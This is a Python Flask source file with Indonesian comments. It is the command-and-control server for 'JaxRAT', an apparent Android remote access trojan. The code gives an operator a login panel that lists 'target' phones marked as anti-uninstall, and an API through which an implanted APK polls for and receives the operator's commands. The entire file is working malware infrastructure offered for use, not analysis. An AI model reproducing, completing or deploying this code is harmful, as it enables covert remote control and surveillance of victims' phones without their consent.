from flask import Flask, render_template, request, jsonify, session, redirect, url_for
import time

app = Flask(__name__)
app.secret_key = 'jaxrat_secret_key_v1_sangat_rahasia'

# --- KONFIGURASI LOGIN JAXRAT ---
USERNAME = "admin"
PASSWORD = "jaxrat123"

# --- DATABASE SEMENTARA (In-Memory) ---
# Nanti APK bakal ngisi data ini otomatis saat konek
devices = {
    "hp_target_1": {"name": "Menunggu Koneksi APK...", "status": "offline", "last_seen": "-", "anti_uninstall": True}
}

latest_commands = {
    "hp_target_1": "none"
}

# --- ROUTE LOGIN & LOGOUT ---
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form['username'] == USERNAME and request.form['password'] == PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('index'))
        return render_template('login.html', error="Akses Ditolak! Username/Password Salah.")
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

# --- ROUTE UTAMA (PROTECTED) ---
@app.route('/')
def index():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    return render_template('index.html', devices=devices)

@app.route('/device/<device_id>')
def device_panel(device_id):
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    if device_id not in devices:
        return "Perangkat tidak ditemukan", 404
    return render_template('panel.html', device_id=device_id, device=devices[device_id])

# --- API UNTUK APK & WEB ---
@app.route('/api/command/<device_id>', methods=['POST'])
def receive_command(device_id):
    if not session.get('logged_in'):
        return jsonify({"status": "error", "message": "Unauthorized"}), 401
    
    data = request.json
    command = data.get("command")
    latest_commands[device_id] = command
    print(f"[JAXRAT] Perintah masuk untuk {device_id}: {command}")
    return jsonify({"status": "success", "received": command})

@app.route('/api/get_command/<device_id>', methods=['GET'])
def get_command(device_id):
    # Endpoint ini buat APK nanya, jadi nggak butuh session web
    cmd = latest_commands.get(device_id, "none")
    latest_commands[device_id] = "none" # Reset setelah dibaca
    return jsonify({"command": cmd})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
